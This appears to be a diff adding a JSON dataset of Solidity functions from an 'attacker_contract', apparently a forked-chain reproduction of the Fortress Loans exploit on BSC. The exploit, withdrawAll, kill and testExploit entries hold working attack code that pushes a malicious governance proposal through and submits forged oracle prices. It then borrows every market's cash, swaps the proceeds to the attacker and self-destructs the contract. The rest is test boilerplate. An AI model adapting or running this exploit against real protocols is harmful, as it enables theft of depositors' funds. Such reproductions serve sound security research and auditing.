@@ -1,0 +1,107 @@
+[
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "exploit",
+    "original_code": "    function exploit() public {\n        // Excute Proposal 11\n        IGovernorAlpha(GovernorAlpha).execute(11);\n        emit log_string(\"\\t[info] Executed Proposal Id 11\");\n\n        // Manipulate the price oracle\n        bytes32 _root = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d886;\n        bytes32[] memory _keys = new bytes32[](2);\n        _keys[0] = 0x000000000000000000000000000000000000000000000000004654532d555344;\n        _keys[1] = 0x0000000000000000000000000000000000000000000000004d4148412d555344;\n        uint256[] memory _values = new uint256[](2);\n        _values[0] = 4e34;\n        _values[1] = 4e34;\n        uint8[] memory _v = new uint8[](4);\n        _v[0] = 28;\n        _v[1] = 28;\n        _v[2] = 28;\n        _v[3] = 28;\n        bytes32[] memory _r = new bytes32[](4);\n        _r[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d885;\n        _r[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d882;\n        _r[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d877;\n        _r[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d881;\n        bytes32[] memory _s = new bytes32[](4);\n        _s[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d825;\n        _s[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d832;\n        _s[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d110;\n        _s[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d841;\n        IChain(ChainContract).submit(uint32(block.timestamp), _root, _keys, _values, _v, _r, _s);\n        emit log_string(\"\\t[info] Chain.submit() Success\");\n\n        // Check the FTS price is manipulated (from Fortress Loans perspective \ud83d\udcc8)\n        // This article explains how Chain.submit() affected FTS price: https://blog.csdn.net/Timmbe/article/details/124678475\n        uint256 _checkpoint;\n        _checkpoint = IFortressPriceOracle(FortressPriceOracle).getUnderlyingPrice(FToken(fFTS));\n        assert(_checkpoint == 4e34); // make sure have same result as mainnet tx\n        emit log_string(\"\\t[info] FortressPriceOracle.getUnderlyingPrice(FToken(fFTS)) Success\");\n\n        // Fetch price\n        _checkpoint = IPriceFeed(PriceFeed).fetchPrice();\n        assert(_checkpoint == 2e34); // make sure have same result as mainnet tx\n        emit log_string(\"\\t[info] PriceFeed.fetchPrice() Success\");\n\n        // Enter fFTS markets\n        address[] memory _tmp = new address[](1);\n        _tmp[0] = fFTS;\n        IUnitroller(Unitroller).enterMarkets(_tmp);\n        emit log_string(\"\\t[info] Unitroller.enterMarkets(fFTS) Success\");\n\n        // Provide 100 FTS Token as collateral, mint fFTS\n        IFTS(FTS).approve(fFTS, type(uint256).max);\n        uint256 _FTS_balance = IFTS(FTS).balanceOf(address(this));\n        IfFTS(fFTS).mint(_FTS_balance);\n        assert(IfFTS(fFTS).balanceOf(address(this)) == 499_999_999_999);\n        emit log_string(\"\\t[info] fFTS.mint(FTS) Success\");\n\n        // Get all Fortress Loans markets\n        address[] memory markets = IUnitroller(Unitroller).getAllMarkets();\n        address fbnb = markets[0]; // 0xe24146585e882b6b59ca9bfaaaffed201e4e5491\n        address fusdc = markets[1]; // 0x3ef88d7fde18fe966474fe3878b802f678b029bc\n        address fusdt = markets[2]; // 0x554530ecde5a4ba780682f479bc9f64f4bbff3a1\n        address fbusd = markets[3]; // 0x8bb0d002bac7f1845cb2f14fe3d6aae1d1601e29\n        address fbtc = markets[4]; // 0x47baa29244c342f1e6cde11c968632e7403ae258\n        address feth = markets[5]; // 0x5f3ef8b418a8cd7e3950123d980810a0a1865981\n        address fltc = markets[6]; // 0xe75b16cc66f8820fb97f52f0c25f41982ba4daf3\n        address fxrp = markets[7]; // 0xa7fb72808de4ffcacf9a815bd1ccbe70f03b54ca\n        address fada = markets[8]; // 0x4c0933453359733b4867dff1145a9a0749931a00\n        address fdai = markets[9]; // 0x5f30fdddcf14a0997a52fdb7d7f23b93f0f21998\n        address fdot = markets[10]; // 0x8fc4f7a57bb19e701108b17d785a28118604a3d1\n        address fbeth = markets[11]; // 0x8ed1f4c1326e5d3c1b6e99ac9e5ec6651e11e3da\n        address fshib = markets[14]; // 0x073c0ac03e7c839c718a65e0c4d0724cc0bd2b5f\n\n        // Borrow ERC-20 Tokens\n        IFBep20Delegator[13] memory Delegators = [\n            IFBep20Delegator(fbnb),\n            IFBep20Delegator(fusdc),\n            IFBep20Delegator(fusdt),\n            IFBep20Delegator(fbusd),\n            IFBep20Delegator(fbtc),\n            IFBep20Delegator(feth),\n            IFBep20Delegator(fltc),\n            IFBep20Delegator(fxrp),\n            IFBep20Delegator(fada),\n            IFBep20Delegator(fdai),\n            IFBep20Delegator(fdot),\n            IFBep20Delegator(fbeth),\n            IFBep20Delegator(fshib)\n        ];\n\n        for (uint8 i; i < Delegators.length; i++) {\n            uint256 borrowAmount = Delegators[i].getCash();\n            Delegators[i].borrow(borrowAmount);\n        }\n\n        emit log_string(\"\\t[info] 13 markets ERC-20 token borrow Success\");\n\n        IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);\n        IBorrowerOperations(BorrowerOperations).openTrove(\n            1e18, 1e27, IERC20(MAHA).balanceOf(address(this)), address(0), address(0), address(0)\n        );\n\n        IERC20(ARTH).approve(ARTHUSD, type(uint256).max);\n        IERC20(ARTHUSD).deposit(1e27);\n\n        IERC20(ARTHUSD).approve(Vyper1, type(uint256).max);\n        IERC20(ARTHUSD).approve(Vyper2, type(uint256).max);\n\n        IVyper(Vyper1).exchange_underlying(0, 3, 5e26, 0, msg.sender);\n        IVyper(Vyper2).exchange_underlying(0, 3, 15e26, 0, msg.sender);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "kill",
+    "original_code": "    function kill() public {\n        selfdestruct(payable(msg.sender));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Attack",
+    "source_type": "attacker_contract",
+    "function_name": "withdrawAll",
+    "original_code": "    function withdrawAll() public {\n        // Get all Fortress Loans markets\n        address[] memory markets = IUnitroller(Unitroller).getAllMarkets();\n        address fbnb = markets[0]; // 0xe24146585e882b6b59ca9bfaaaffed201e4e5491\n        address fusdc = markets[1]; // 0x3ef88d7fde18fe966474fe3878b802f678b029bc\n        address fusdt = markets[2]; // 0x554530ecde5a4ba780682f479bc9f64f4bbff3a1\n        address fbusd = markets[3]; // 0x8bb0d002bac7f1845cb2f14fe3d6aae1d1601e29\n        address fbtc = markets[4]; // 0x47baa29244c342f1e6cde11c968632e7403ae258\n        address feth = markets[5]; // 0x5f3ef8b418a8cd7e3950123d980810a0a1865981\n        address fltc = markets[6]; // 0xe75b16cc66f8820fb97f52f0c25f41982ba4daf3\n        address fxrp = markets[7]; // 0xa7fb72808de4ffcacf9a815bd1ccbe70f03b54ca\n        address fada = markets[8]; // 0x4c0933453359733b4867dff1145a9a0749931a00\n        address fdai = markets[9]; // 0x5f30fdddcf14a0997a52fdb7d7f23b93f0f21998\n        address fdot = markets[10]; // 0x8fc4f7a57bb19e701108b17d785a28118604a3d1\n        address fbeth = markets[11]; // 0x8ed1f4c1326e5d3c1b6e99ac9e5ec6651e11e3da\n        address fshib = markets[14]; // 0x073c0ac03e7c839c718a65e0c4d0724cc0bd2b5f\n\n        IFBep20Delegator[13] memory Delegators = [\n            IFBep20Delegator(fbnb),\n            IFBep20Delegator(fusdc),\n            IFBep20Delegator(fusdt),\n            IFBep20Delegator(fbusd),\n            IFBep20Delegator(fbtc),\n            IFBep20Delegator(feth),\n            IFBep20Delegator(fltc),\n            IFBep20Delegator(fxrp),\n            IFBep20Delegator(fada),\n            IFBep20Delegator(fdai),\n            IFBep20Delegator(fdot),\n            IFBep20Delegator(fbeth),\n            IFBep20Delegator(fshib)\n        ];\n\n        // Swap each underlyAsset to attacker, Path: Asset->WBNB->USDT\n        for (uint256 i = 0; i < 13; i++) {\n            if (address(Delegators[i]) == 0xE24146585E882B6b59ca9bFaaaFfED201E4E5491) continue; // Skip Fortress BNB  (fBNB), use singleHop swap later\n            if (address(Delegators[i]) == 0x554530ecDE5A4Ba780682F479BC9F64F4bBFf3a1) continue; // Skip Fortress USDT (fUSDT), transfer USDT later\n\n            address underlyAsset = Delegators[i].underlying(); // Resolve underlyAsset address\n            uint256 amount = IERC20(underlyAsset).balanceOf(address(this)); // Get each underlyAsset balance\n\n            address[] memory mulitHop = new address[](3); // Do swap\n            mulitHop[0] = underlyAsset;\n            mulitHop[1] = WBNB;\n            mulitHop[2] = USDT;\n            IERC20(underlyAsset).approve(PancakeRouter, type(uint256).max);\n            IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokens(\n                amount, 0, mulitHop, msg.sender, block.timestamp\n            );\n        }\n\n        // Swap WBNB->USDT to attacker\n        address[] memory singleHop = new address[](2);\n        singleHop[0] = WBNB;\n        singleHop[1] = USDT;\n        IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{value: address(this).balance}(\n            0, singleHop, msg.sender, block.timestamp\n        );\n        emit log_string(\"\\t[Pass] Swap BNB->USDT, amountOut send to attacker\");\n\n        // Transfer all USDT balance to attacker\n        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));\n        IERC20(USDT).transfer(msg.sender, usdt_balance);\n        emit log_string(\"\\t[Pass] Transfer all USDT balance to attacker\");\n    }\n\n    /* Method 0xd4ddb845 */\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Hacker",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        // txId : 0x18dc1cafb1ca20989168f6b8a087f3cfe3356d9a1edd8f9d34b3809985203501\n        // Do : Attacker Create [ProposalCreater] Contract\n        vm.rollFork(17_490_837); // make sure start from block 17490837\n        vm.startPrank(attacker); // Set msg.sender = attacker\n        ProposalCreateFactory PCreater = new ProposalCreateFactory();\n        vm.stopPrank();\n        vm.label(address(PCreater), \"ProposalCreateFactory\");\n        emit log_named_address(\"[Pass] Attacker created [ProposalCreater] contract\", address(PCreater));\n\n        // txId : 0x12bea43496f35e7d92fb91bf2807b1c95fcc6fedb062d66678c0b5cfe07cc002\n        // Do : Create Proposal Id 11\n        vm.createSelectFork(\"bsc\", 17_490_882);\n\n        address[] memory _target = new address[](1);\n        uint256[] memory _value = new uint256[](1);\n        string[] memory _signature = new string[](1);\n        bytes[] memory _calldata = new bytes[](1);\n\n        _target[0] = Unitroller;\n        _value[0] = 0;\n        _signature[0] = \"_setCollateralFactor(address,uint256)\";\n        _calldata[0] = abi.encode(fFTS, 700_000_000_000_000_000);\n\n        vm.prank(address(PCreater));\n        IGovernorAlpha(GovernorAlpha).propose(\n            _target, _value, _signature, _calldata, \"Add the FTS token as collateral.\"\n        );\n        emit log_string(\"[Pass] Attacker created Proposal Id 11\");\n\n        // txId : 0x83a4f8f52b8f9e6ff1dd76546a772475824d9aa5b953808dbc34d1f39250f29d\n        // Do : Vote Proposal Id 11\n        vm.createSelectFork(\"bsc\", 17_570_125);\n        vm.prank(0x58f96A6D9ECF0a7c3ACaD2f4581f7c4e42074e70); // Malicious voter\n        IGovernorAlpha(GovernorAlpha).castVote(11, true);\n        emit log_string(\"[Pass] Unknown malicious voter supported Proposal 11\");\n\n        // txId : 0xc368afb2afc499e7ebb575ba3e717497385ef962b1f1922561bcb13f85336252\n        // Do : Vote Proposal Id 11\n        vm.createSelectFork(\"bsc\", 17_570_164);\n        vm.prank(attacker);\n        IGovernorAlpha(GovernorAlpha).castVote(11, true);\n        emit log_string(\"[Pass] Attacker supported Proposal 11\");\n\n        // txId : 0x647c6e89cd1239381dd49a43ca2f29a9fdeb6401d4e268aff1c18b86a7e932a0\n        // Do : Queue Proposal Id 11\n        vm.createSelectFork(\"bsc\", 17_577_532);\n        vm.prank(attacker);\n        IGovernorAlpha(GovernorAlpha).queue(11);\n        emit log_string(\"[Pass] Attacker queued Proposal 11\");\n\n        // txId : 0x4800928c95db2fc877f8ba3e5a41e208231dc97812b0174e75e26cca38af5039\n        // Do : Create Attack Contract\n        vm.createSelectFork(\"bsc\", 17_634_589);\n        vm.setNonce(attacker, 69);\n        vm.startPrank(attacker);\n        Attack attackContract = new Attack();\n        vm.stopPrank();\n        vm.label(address(attackContract), \"AttackContract\");\n        assert(address(attackContract) == 0xcD337b920678cF35143322Ab31ab8977C3463a45); // make sure deployAddr is same as mainnet\n        emit log_named_address(\"[Pass] Attacker created [AttackContract] contract\", address(attackContract));\n\n        // txId : 0x6a04f47f839d6db81ba06b17b5abbc8b250b4c62e81f4a64aa6b04c0568dc501\n        // Do : Send 3.0203 MahaDAO to Attack Contract\n        // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)\n        stdstore.target(MAHA).sig(IERC20(MAHA).balanceOf.selector).with_key(address(attackContract)).checked_write(\n            3_020_309_536_199_074_866\n        );\n        assert(IERC20(MAHA).balanceOf(address(attackContract)) == 3_020_309_536_199_074_866);\n        emit log_string(\"[Pass] Attacker send 3.0203 MahaDAO to [AttackContract] contract\");\n\n        // txId : 0xd127c438bdac59e448810b812ffc8910bbefc3ebf280817bd2ed1e57705588a0\n        // Do : Send 100 FTS to Attack Contract\n        // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)\n        stdstore.target(FTS).sig(IFTS(FTS).balanceOf.selector).with_key(address(attackContract)).checked_write(\n            100 ether\n        );\n        assert(IFTS(FTS).balanceOf(address(attackContract)) == 100 ether);\n        emit log_string(\"[Pass] Attacker send 100 FTS to [AttackContract] contract\");\n\n        // txId : 0x13d19809b19ac512da6d110764caee75e2157ea62cb70937c8d9471afcb061bf\n        // Do : Execute Proposal Id 11\n        vm.roll(17_634_663); // No fork here, otherwise will get Error(\"do not spam\") in Chain.sol\n        vm.warp(1_652_042_082); // 2022-05-08 20:34:42 UTC+0\n        vm.startPrank(attacker);\n        attackContract.exploit();\n        vm.stopPrank();\n        emit log_string(\"[Pass] Attacker triggered the exploit\");\n\n        // txId : 0x851a65865ec89e64f0000ab973a92c3313ea09e80eb4b4660195a14d254cd425\n        // Do : Withdraw All\n        vm.roll(17_634_670); // We need to verify the reproduce run as expected, so don't use createSelectFork()\n        vm.warp(1_651_998_903); // 2022-05-08 20:35:03 UTC+0\n        vm.startPrank(attacker);\n        attackContract.withdrawAll();\n        vm.stopPrank();\n        emit log_string(\"[Pass] Attacker successfully withdrew the profit\");\n\n        // txId : 0xde8d9d55a5c795b2b9b3cd5b648a29b392572719fbabd91993efcd2bc57110d3\n        // Do : Destruct the Attack Contract\n        vm.roll(17_635_247);\n        vm.warp(1_652_043_834); // 2022-05-08 21:03:54 UTC+0\n        vm.startPrank(attacker);\n        attackContract.kill();\n        vm.stopPrank();\n        emit log_string(\"[Pass] Attacker destruct the Attack Contract\");\n\n        emit log_named_decimal_uint(\"[End] Attacker Wallet USDT Balance\", IERC20(USDT).balanceOf(attacker), 18);\n\n        // You shold see attacker profit about 300K USDT\n        // The USDT were moved after swapping across the cBridge(Celer Network), and swapped them into ETH and DAI.\n    }\n\n",
+    "description": ""
+  }
+]
